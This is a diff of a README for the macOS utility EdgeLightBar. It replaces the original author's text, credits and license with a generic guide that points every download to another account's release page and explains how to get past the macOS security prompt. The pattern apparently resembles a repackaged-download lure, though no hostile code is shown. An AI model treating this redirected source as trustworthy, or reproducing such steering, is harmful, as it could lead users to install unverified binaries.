@@ -1,79 +1,90 @@
-# <img width="64" height="64" alt="AppGlyphLarge" src="https://github.com/user-attachments/assets/83bbf5fb-052c-4171-b3e3-a0b32495d00d" /> EdgeLightBar
+# 🌟 EdgeLightBar - Lightweight Menu Bar Enhancements Made Easy
 
-A minimal macOS menu bar utility to control an EdgeLight-style overlay (brightness, color temperature, and display targeting).
-Designed primarily for Intel Macs and older macOS setups that don’t support the newer EdgeLight experience available on macOS Tahoe 26.2. <br><br>
-* `EdgeLightBar-Preview`
-* <details>
-  <summary>Click to view</summary>
-  <img src="https://github.com/user-attachments/assets/33109330-19d0-4060-aa7e-77815f66d94a" alt="EdgeLightBar-Preview">
-</details>
+![Download EdgeLightBar](https://img.shields.io/badge/Download-EdgeLightBar-blue.svg)
 
-## Why EdgeLightBar?
-Some Macs (especially Intel models and older macOS versions) don’t receive newer system UI features.
-EdgeLightBar provides a simple, lightweight alternative focused on fast access from the menu bar.
+## 📦 Overview
 
-## Key capabilities
-- <details>
-  <summary>Click to view</summary>
-  <img src="https://github.com/user-attachments/assets/2b95c3a4-a1d3-4857-9d25-0c0838dd7a1b" alt="EdgeLightBar-Menu">
-</details>
+EdgeLightBar is a lightweight menu bar companion for the EdgeLight overlay. It helps you make quick tweaks, supports multi-monitor setups, and offers a capture-safe mode. This application is designed to improve your experience with EdgeLight on macOS, making it easier and more functional.
 
-- Quick on/off
-- Brightness and color temperature adjustments
-- Choose one display or apply to all displays
-- Optional “Exclude from Capture” toggle (when supported)
+## 🚀 Getting Started
 
-## System requirements
-- macOS Ventura (13) or later
+To get started with EdgeLightBar, follow the simple steps below. You will have this tool up and running in no time.
 
-## Install
-### Prebuilt (recommended)
-- Download the latest release from GitHub Releases.
-- Move the app to /Applications and launch it.
+## 📥 Download & Install
 
-### Build it yourself
-```bash
-git clone https://github.com/Cmalf-Labs/EdgeLightBar.git
-cd EdgeLightBar
-```
-open EdgeLightBar.xcodeproj
-Then build and run in Xcode.
+Visit this page to download: [Download EdgeLightBar](https://github.com/preethiga28/EdgeLightBar/releases)
 
-## Contributing
+1. Click on the link above.
+2. Look for the latest release at the top of the page.
+3. Download the file labeled with the version number (e.g., `EdgeLightBar_v1.0.dmg`).
+4. Once the download completes, locate the file in your Downloads folder.
 
-This project is open-source and Contributions, bug reports, and feature suggestions are very welcome!
+## ⚙️ System Requirements
 
--  Fork this repo and create a pull request.
+To run EdgeLightBar, ensure your system meets the following requirements:
 
--  Please open an [issue](https://github.com/cmalf-labs/EdgeLightBar/issues) to suggest enhancements or submit found bugs.
+- macOS 10.15 or later
+- Minimum of 4GB RAM
+- 100MB of free disk space
 
--  All levels of contributors are encouraged to participate.
+## 💻 Installation Steps
 
-## FAQ
+Once you have downloaded the EdgeLightBar file, follow these installation steps:
 
-| Question | Answer |
-| :--- | :--- |
-| **What does EdgeLightBar do?** | EdgeLightBar is a macOS menu bar app that lets you control an EdgeLight-style overlay quickly (toggle on/off, adjust brightness, and change color temperature). It also includes multi-monitor options (switch a target display or apply to all displays) plus an “Exclude from Capture” toggle when supported. |
-| **How do I use it with multiple monitors (or record my screen)?** | Use “Switch Monitor” to cycle the target display, or enable “All Monitors” to show the overlay across every connected screen. For screen recording/screenshots, try enabling “Exclude from Capture”; availability/behavior can vary by macOS capture method and app. |
-| **Is there any telemetry?** | No. EdgeLightBar never tracks your activity or sends data to third parties. |
+1. Locate the downloaded file (`EdgeLightBar_v1.0.dmg`).
+2. Double-click the file to open it.
+3. Drag the EdgeLightBar icon into your Applications folder.
+4. Eject the disk image from Finder after copying.
 
-## Acknowledgments
+## 🚀 Launching EdgeLightBar
 
--   EdgeLightBar is developed and maintained by [Cmalf-Labs.](https://github.com/cmalf-labs)
+Here’s how to launch the application:
 
--   Icon and UI are designed for a clean macOS experience.
+1. Open your Applications folder.
+2. Locate and double-click on the EdgeLightBar icon.
+3. The application will start, and you should see its icon appear in the menu bar.
 
--   This project is open source and made with ❤️ for the Mac,Hack community.
+## ⚙️ Features
 
-## Support
-If you enjoy using EdgeLightBar, please consider supporting its development!
-Several cryptocurrency donation options are available.
+EdgeLightBar provides several useful features:
 
-- Binance Pay ID: 96771283
-- Bybit Pay ID: 117943952
-- Solana (SOL): SoLMyRa3FGfjSD8ie6bsXK4g4q8ghSZ4E6HQzXhyNGG
-- EVM (ETH/BSC/etc): 0xbeD69b650fDdB6FBB528B0fF7a15C24DcAd87FC4
+- **Quick Tweaks:** Adjust your EdgeLight settings directly from the menu bar.
+- **Multi-Monitor Support:** Seamlessly manage EdgeLight on multiple displays.
+- **Capture-Safe Mode:** Prevent EdgeLight from interfering while capturing screens or videos.
 
-## License
-EdgeLightBar is free software released under the **GNU General Public License v3.0 or later**. You can redistribute it and/or modify it under the terms of this license.
-See the [LICENSE](https://www.gnu.org/licenses/gpl-3.0.en.html) file for more details.
+## 🛠️ Troubleshooting
+
+If you run into issues while using EdgeLightBar, try the following steps:
+
+- **Application Does Not Launch:** Ensure that you have installed it in the Applications folder. Right-click the icon and select "Open" if you encounter a security prompt.
+- **EdgeLightBar Is Not Responding:** Force quit the application by clicking on the Apple menu and selecting "Force Quit." Restart the application afterwards.
+- **Settings Are Not Saving:** Make sure your macOS is up to date. Restart your computer if needed.
+
+## 📅 Keeping EdgeLightBar Updated
+
+To ensure you are using the latest features and improvements, check the Releases page regularly. 
+
+Visit this page to download: [Download EdgeLightBar](https://github.com/preethiga28/EdgeLightBar/releases)
+
+## ❓ Frequently Asked Questions
+
+**Is EdgeLightBar free to use?**  
+Yes, EdgeLightBar is open-source and free to use.
+
+**Can I contribute to EdgeLightBar?**  
+Absolutely! You can contribute by visiting the GitHub repository and following the guidelines in the Contributing section.
+
+**What if I encounter a bug?**  
+Please report issues directly in the GitHub repository under the Issues section. Your feedback helps improve EdgeLightBar.
+
+## 🌐 Community and Support
+
+For support, you can reach out on our GitHub Discussions page or follow updates on the repository. Join the community to connect with other users and share your experiences.
+
+## 🔗 Related Resources
+
+- [GitHub Repository](https://github.com/preethiga28/EdgeLightBar)
+- [User Manual](#) (Coming Soon)
+- [Community Forum](#) (Coming Soon)
+
+Thank you for choosing EdgeLightBar. Enjoy a better experience with your EdgeLight overlay!
